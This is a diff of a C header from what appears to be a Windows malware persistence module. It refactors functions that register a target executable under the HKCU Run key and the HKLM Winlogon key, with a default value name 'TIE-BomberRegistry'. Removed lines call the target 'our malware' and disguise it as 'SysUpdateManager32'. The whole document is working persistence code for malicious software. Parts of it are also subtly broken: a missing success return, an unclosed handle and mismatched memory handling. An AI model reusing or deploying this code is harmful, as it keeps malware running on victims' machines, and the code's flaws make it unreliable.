@@ -5,9 +5,8 @@
 #include <stdlib.h>
 #include "helper.h" 
 
-#define PERS_NAME "SysUpdateManager32"
-
-struct _PERS_CONTEXT {
+typedef struct _PERS_CONTEXT {
+    HKEY hiveKey;
     char *regKey;
     char *valueName;
     char *valueData;
@@ -17,85 +16,94 @@ struct _PERS_CONTEXT {
     DWORD targetPathLen;
 } PERS_CONTEXT, *PPERS_CONTEXT;
 
-int GetRegName()
+int GetRegName(char *valueName, void *data) {
+    PPERS_CONTEXT pPc = (PPERS_CONTEXT) data;
+    if (*valueName != '\0') {
+        pPc->valueName = valueName;
+    } else {
+        snprintf(pPc->valueName, MAX_REG_VALUE_NAME, "TIE-BomberRegistry");
+    }
+
+    return SUCCESS;
+}
 
 BOOL ModifyRegistry(PPERS_CONTEXT pPc) {
-    char PERS_NAME[64];
     HKEY hKey = NULL;
     LONG rc;
 
-    rc = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR) pPc->regKey, 0, KEY_WRITE, &hKey);
+    rc = RegOpenKeyEx(pPc->hiveKey, (LPCSTR) pPc->regKey, 0, KEY_WRITE, &hKey);
     if (rc != ERROR_SUCCESS) {
         TranslateErrorPrint(GetLastError());
         return FALSE;
     }
 
-    rc = RegSetValueEx(hKey, (LPCSTR) pPc->regName, 0, pPc->dwType, (unsigned char*) pPc->regValue, *(pPc->regValueLen));
+    rc = RegSetValueEx(hKey, (LPCSTR) pPc->valueName, 0, pPc->valueType, (unsigned char*) pPc->valueData, *(pPc->valueDataLen));
     if (rc != ERROR_SUCCESS) {
         TranslateErrorPrint(GetLastError());
         RegCloseKey(hKey);
         return FALSE;
     }
 
-    printf("[+] Registry value successfully set\n")
+    printf("[+] Registry value successfully set\n");
 }
 
 BOOL InjectRunRegistry(PPERS_CONTEXT pPc) {
-	HKEY hKey = NULL;
-	const char *REG = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+	const char *reg = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+    int regLen = strlen(reg);
+    pPc->regKey = malloc(MAX_REG_KEY_NAME + 1);
+    pPc->valueName = malloc(MAX_REG_VALUE_NAME + 1);
+    BOOL rc = FALSE;
+    
+    pPc->hiveKey = HKEY_CURRENT_USER;
+    memcpy(pPc->regKey, reg, regLen);
+    pPc->regKey[regLen] = '\0';
+    pPc->valueData = pPc->targetPath;
+    pPc->valueDataLen = &(pPc->targetPathLen);
+    pPc->valueType = REG_SZ;
 
-    pPc->regKey = REG;
-    pPc->regValue = pPc->targetPath;
-    pPc->regValueLen = &(pPc->targetPathLen);
-    pPc->dwType = REG_SZ;
+    if (!PromptUntilValid("Enter value name[ENTER for default]", pPc->valueName, MAX_REG_VALUE_NAME, (ValidatorFunc) &GetRegName, pPc, TRUE)) {
+        goto cleanup;
+    }
+    if (!ModifyRegistry(pPc)) {
+        goto cleanup;
+    }
+    rc = TRUE;
 
-	// Get our handle to the registry
-	LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)REG, 0, KEY_WRITE, &hKey);
-	if (result != ERROR_SUCCESS) {
-        TranslateErrorPrint(GetLastError());
-		return FALSE;
-	}
+cleanup:
+    free(pPc->regKey);
+    free(pPc->valueName);
 
-	// Add to the registry key, the path to our malware
-	result = RegSetValueEx(hKey, (LPCSTR)PERS_NAME, 0, REG_SZ, (unsigned char *)malwareFull, malwareFullLen);
-	if (result != ERROR_SUCCESS) {
-        TranslateErrorPrint(GetLastError());
-		RegCloseKey(hKey);
-		return FALSE;
-	}
-
-	printf("[+] Run registry key set for: %s\n", malwareFull);
-	return TRUE;
+	return rc;
 }
 
-BOOL InjectWinlogonRegistry(const char *malwareFull, int malwareFullLen) {
-	HKEY hKey = NULL;
-	const char *REG = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon";
+BOOL InjectWinlogonRegistry(PPERS_CONTEXT pPc) {
+	const char *reg = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon";
+    int regLen = strlen(reg);
+    pPc->regKey = malloc(MAX_REG_KEY_NAME + 1);
+    pPc->valueName = malloc(MAX_REG_VALUE_NAME + 1);
+    BOOL rc = FALSE;
+    
+    pPc->hiveKey = HKEY_LOCAL_MACHINE;
+    memcpy(pPc->regKey, reg, regLen);
+    pPc->regKey[regLen] = '\0';
+    pPc->valueData = pPc->targetPath;
+    pPc->valueDataLen = &(pPc->targetPathLen);
+    pPc->valueType = REG_SZ;
 
-	// Get our handle to the registry
-	LONG result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)REG, 0, KEY_WRITE, &hKey);
-	if (result != ERROR_SUCCESS) {
-		errCode = GetLastError();
-		TranslateError(errCode, &errMsg);
-		printf("[-] An error occured while opening the Winlogon registry key: %s\n", errMsg);
-		LocalFree(errMsg);
-		return FALSE;
-	}
+    if (!PromptUntilValid("Enter value name[ENTER for default]", pPc->valueName, MAX_REG_VALUE_NAME, (ValidatorFunc) &GetRegName, pPc, TRUE)) {
+        goto cleanup;
+    }
+    if (!ModifyRegistry(pPc)) {
+        goto cleanup;
+    }
+    rc = TRUE;
 
-	// Add to the registry key, the path to our malware
-	result = RegSetValueEx(hKey, (LPCSTR)PERS_NAME, 0, REG_SZ, (unsigned char *)malwareFull, malwareFullLen);
-	if (result != ERROR_SUCCESS) {
-		errCode = GetLastError();
-		TranslateError(errCode, &errMsg);
-		printf("[-] An error occured while setting registry key: %s\n", errMsg);
-		LocalFree(errMsg);
-		RegCloseKey(hKey);
-		return FALSE;
-	}
+cleanup:
+    free(pPc->regKey);
+    free(pPc->valueName);
 
-	printf("Winlogon registry key set for: %s\n", malwareFull);
-	return TRUE;
+	return rc;
 }
 
-#endif // PERSH_H
+#endif // PERS_H
 
